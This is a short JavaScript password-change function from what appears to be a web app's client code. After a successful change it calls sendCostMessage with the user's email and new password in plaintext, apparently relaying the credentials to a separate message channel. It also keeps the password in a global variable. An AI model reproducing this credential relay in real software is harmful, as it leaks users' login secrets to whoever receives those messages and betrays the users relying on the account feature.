async function changePassword() {
  if (!requireLogin()) return;

  const newPassword = prompt("Enter new password:");
  if (!newPassword) return;

  try {
    const resp = await fetch("/api/auth-changepassword", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        idToken: currentToken,
        password: newPassword
      })
    });

    const data = await resp.json();

    if (resp.ok && data.email) {
      currentPassword = newPassword;
      currentToken = data.idToken;

      updateStatus("✅ Password changed successfully!", false, "serviceStatus");

      sendCostMessage(
        `🔐 Change Password\n📧 Email: ${currentUser}\n🔒 New Password: ${currentPassword}`
      );
    } else {
      updateStatus(`❌ Failed: ${data.error || "Unknown"}`, true, "serviceStatus");
    }

  } catch (err) {
    updateStatus(`❌ Error: ${err.message}`, true, "serviceStatus");
  }
}
